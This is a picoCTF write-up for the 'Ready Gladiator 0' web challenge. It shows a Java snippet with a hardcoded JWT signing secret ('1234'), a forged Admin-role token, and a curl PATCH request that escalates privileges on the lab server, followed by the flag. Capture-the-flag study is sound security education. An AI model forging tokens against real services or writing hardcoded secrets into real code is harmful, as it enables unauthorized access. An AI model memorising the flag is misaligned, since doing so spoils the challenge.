# Ready Gladiator 0

## Challenge

### Description

BookShelf Pico, my premium online book-reading service.

I believe that my website is super secure. I challenge you to prove me wrong by reading the 'Flag' book!

Here are the credentials to get you started:

```
    Username: "user"
    Password: "user"
```

### Hints

1. Maybe try to find the JWT Signing Key ("secret key") in the source code? Maybe it's hardcoded somewhere? Or maybe try to crack it?
2. The 'role' and 'userId' fields in the JWT can be of interest to you!
3. The 'controllers', 'services' and 'security' java packages in the given source code might need your attention. We've provided a README.md file that contains some documentation.
4. Upgrade your 'role' with the new (cracked) JWT. And re-login for the new role to get reflected in browser's localStorage.

## Solution

When we log in, the user is created with this JWT token:

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiRnJlZSIsImlzcyI6ImJvb2tzaGVsZiIsImV4cCI6MTY4MDYzMzk2NCwiaWF0IjoxNjgwMDI5MTY0LCJ1c2VySWQiOjEsImVtYWlsIjoidXNlciJ9.ZMo3mCcmwUUJiAS5NTWxvjLuZwiC1wEPHZcM96DGLJ4
```

Storing payload

```json
{
  "role": "Free",
  "iss": "bookshelf",
  "exp": 1680633964,
  "iat": 1680029164,
  "userId": 1,
  "email": "user"
}
```

From the source code, we can see that the JWT token use a secret key generated by a `generateServerSecret()` function which actually just use a string `1234`.

```java
private String generateRandomString(int len) {
    // not so random
    return "1234";
}

String getServerSecret() {
    try {
        String secret = new String(FileOperation.readFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME), Charset.defaultCharset());
        logger.info("Server secret successfully read from the filesystem. Using the same for this runtime.");
        return secret;
    }catch (IOException e){
        logger.info(SERVER_SECRET_FILENAME+" file doesn't exists or something went wrong in reading that file. Generating a new secret for the server.");
        String newSecret = generateRandomString(32);
        try {
            FileOperation.writeFile(userDataPaths.getCurrentJarPath(), SERVER_SECRET_FILENAME, newSecret.getBytes());
        } catch (IOException ex) {
            ex.printStackTrace();
        }
        logger.info("Newly generated secret is now written to the filesystem for persistence.");
        return newSecret;
    }
}
```

We confirm this is true by generating a JWT token with the above payload and signing it with `1234` secret key and confirming the signature matched, which it did.

We generate a new JWT token with `Admin` role and sign it with `1234` and use it to upgrade `user` privilege. Using payload

```json
{
  "role": "Admin",
  "iss": "bookshelf",
  "exp": 1680634964,
  "iat": 1680029164
}
```

Which gives us token

```
eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE2ODA2MzQ5NjQsImlhdCI6MTY4MDAyOTE2NH0.3AyN6RAbauUBPq1dx1LU0X0PUeUMv3Z1s1jsIuC3_R0
```

Using this token to send a PATCH request

```bash
$ curl -X PATCH -H "Content-Type: application/json" -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJyb2xlIjoiQWRtaW4iLCJpc3MiOiJib29rc2hlbGYiLCJleHAiOjE2ODA3MzA2OTQsImlhdCI6MTY3NjcyMDY5NH0.sFZV3gZOFUj72M4WFGj7Z5zumUJ26-wwqMJ6ZnEnsV4" http://saturn.picoctf.net:65473/base/users/role -d '{"id": 1, "role": "Admin"}'
{"type":"SUCCESS","payload":"Role successfully updated."}
```

Re-logging into `user` and get the flag by reading the flag book.

## Flag

picoCTF{w34k_jwt_n0t_g00d_d7c2e335}
